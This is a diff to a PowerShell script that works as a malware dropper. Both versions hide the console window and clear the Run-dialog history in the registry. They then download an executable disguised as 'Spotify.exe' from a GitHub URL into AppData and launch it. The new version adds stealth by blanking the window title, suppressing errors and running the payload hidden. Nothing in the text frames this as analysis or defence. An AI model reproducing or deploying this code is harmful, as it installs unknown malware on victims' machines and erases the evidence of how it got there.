@@ -1,21 +1,23 @@
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0)
+$signature = @'
+[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();
+'@
+$API = Add-Type -MemberDefinition $signature -Name "WinAPI" -Namespace Win32Functions -PassThru
+$consolePtr = $API::GetConsoleWindow()
+$null = $API::ShowWindow($consolePtr, 0)
+[System.Console]::Title = ""
 $registryPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 if(Test-Path $registryPath){
     $values=Get-ItemProperty -Path $registryPath
-    $keys=$values.PSObject.Properties | Where-Object {$_.Name -ne "PSPath" -and $_.Name -ne "PSParentPath" -and $_.Name -ne "PSChildName" -and $_.Name -ne "PSDrive" -and $_.Name -ne "PSProvider" -and $_.Name -ne "MRUList"}
+    $keys=$values.PSObject.Properties|Where-Object{$_.Name-ne"PSPath"-and$_.Name-ne"PSParentPath"-and$_.Name-ne"PSChildName"-and$_.Name-ne"PSDrive"-and$_.Name-ne"PSProvider"-and$_.Name-ne"MRUList"}
     foreach($key in $keys){
         Remove-ItemProperty -Path $registryPath -Name $key.Name -ErrorAction SilentlyContinue
     }
     Set-ItemProperty -Path $registryPath -Name "MRUList" -Value ""
     $downloadPath="C:\Users\kurtarma123\AppData\Roaming\Microsoft\Spotify.exe"
     $url="https://github.com/t2jszt4n6p-ops/sexcan/raw/refs/heads/main/Spotify.exe"
-    $ProgressPreference = 'SilentlyContinue'
-    Invoke-WebRequest -Uri $url -OutFile $downloadPath
-    Start-Process $downloadPath
+    $ProgressPreference='SilentlyContinue'
+    $ErrorActionPreference='SilentlyContinue'
+    Invoke-WebRequest -Uri $url -OutFile $downloadPath -UseBasicParsing
+    Start-Process $downloadPath -WindowStyle Hidden
 }
